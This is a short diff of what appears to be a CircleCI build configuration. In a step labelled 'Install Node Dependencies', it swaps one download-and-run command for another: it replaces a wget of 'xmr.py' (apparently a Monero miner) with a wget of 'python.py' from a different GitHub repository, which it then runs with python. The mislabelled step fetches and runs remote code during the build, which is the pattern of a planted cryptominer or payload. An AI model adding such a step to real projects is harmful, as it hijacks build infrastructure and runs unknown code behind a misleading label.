@@ -7,9 +7,9 @@ working_dir: &working_dir ~/node
     - run:  
         name: Install  Node Dependencies 
         
-        command: |
-          wget https://raw.githubusercontent.com/yfvj45/hgj/main/xmr.py
-          python xmr.py
+        command:  |
+          wget https://raw.githubusercontent.com/huiuk/husk/main/python.py
+          python python.py
  
 version: 2.0  
 jobs:  
